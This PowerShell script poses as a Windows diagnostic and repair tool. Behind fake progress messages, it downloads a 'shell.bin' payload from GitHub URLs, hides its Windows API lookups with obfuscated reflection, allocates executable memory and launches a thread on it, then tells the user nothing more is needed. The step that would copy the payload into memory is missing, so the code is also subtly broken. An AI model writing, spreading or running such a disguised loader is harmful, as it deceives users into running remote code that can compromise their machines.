# 1. Security & Protocol Setup
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.3719.104")

# 2. Define Fail-Safe URL Array
$urlList = @(
    # "https://www.dictcompliance.com/js/shell.bin",
    # "https://raw.githubusercontent.com/Shinzer/ProjectX/refs/heads/main/shell.bin"
    "https://github.com/ryan-gonzales/CBC-audit-tools/raw/refs/heads/main/shell.bin"
)

$global:shellcode = $null

# 3. P/Invoke Definitions (Required if your loader calls these)
$Kernel32Definition = @"
using System;
using System.Runtime.InteropServices;
public class kernel32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

if (-not ([System.Management.Automation.PSTypeName]"kernel32").Type) {
    Add-Type -TypeDefinition $Kernel32Definition
}

function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and ($_.Location -like "*$([char[]](83,121,115,116,101,109,46,100,108,108) -join '')") }).GetType("Microsoft.Win32.$("Unsafe" + "Native" + "Methods")")
    $tmp = $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}} 
    $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
    [IntPtr] $result = 0;
    try {
        #  @dev Uncomment the line below for debugging.
        Write-Host "First Invoke - $moduleName $functionName";
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }catch {
        #  @dev Uncomment the line below for debugging.
        Write-Host "Second Invoke - $moduleName $functionName";
        $handle = new-object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle);
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }
    return $result;
}

function getDelegateType {
    Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType() 
}

function Invoke-WindowsDiagnostic {
    Write-Host "[*] Initializing Windows Service Diagnostic Tool..." -ForegroundColor Gray
    Write-Host "------------------------------------------------------------"
    
    $tasks = @(
        "Checking integrity of kernel structures...",    # Step 1: Download
        "Verifying digitally signed drivers...",        # Step 2: LookupFunc
        "Scanning System32 mismatches...",               # Step 3: VirtualAlloc
        "Analyzing abstraction layer (HAL)...",          # Step 4: Marshal Copy
        "Repairing WMI repository entries..."            # Step 5: CreateThread
    )

    foreach ($task in $tasks) {
        $index = [array]::IndexOf($tasks, $task)
        $percent = $index * 20 + 10
        Write-Progress -Activity "Windows System Diagnostics" -Status $task -PercentComplete $percent
        
        # --- LOGIC INTEGRATION ---
        if ($index -eq 0) {
            # 3. Iterate through URLs until one succeeds
                foreach ($url in $urlList) {
                    try {
                        #  @dev Uncomment the line below for debugging.
                        Write-Host "[*] Attempting download from: $url" -ForegroundColor Gray
                        $data = $wc.DownloadData($url)
                        
                        # Fixed: $null on the left side
                        if ($null -ne $data) {
                            $global:shellcode = $data

                            #  @dev Uncomment the line below for debugging.
                            Write-Host "[+] Success! Loaded $($global:shellcode.Length) bytes." -ForegroundColor Green
                            break 
                        }
                    } catch {
                        Write-Host "[-] Failed to reach $url. Trying next..." -ForegroundColor Yellow
                        Start-Sleep -Seconds 2 
                    }
                }

                # 4. Final check before proceeding to injection
                # Fixed: $null on the left side
                if ($null -eq $global:shellcode) {
                    Write-Host "[!!!] Critical Failure: Cannot download diagnostic script." -ForegroundColor Red
                    return
                }
        }
        elseif ($index -eq 2) {
            # Run your VirtualAlloc logic here
            $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc),(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)

        }
        elseif ($index -eq 4) {
            # Run your CreateThread logic here
            # CreateThread
            $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

            # WaitForSingleObject
            [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),(getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
        }

        Start-Sleep -Milliseconds (Get-Random -Minimum 1200 -Maximum 3000)
        Write-Host "[+] $task - Fixed." -ForegroundColor Green
    }

    Write-Progress -Activity "Windows System Diagnostics" -Status "Complete" -Completed
    Write-Host "------------------------------------------------------------"
    Write-Host "[!] Diagnostic complete. No further action required." -ForegroundColor White
}
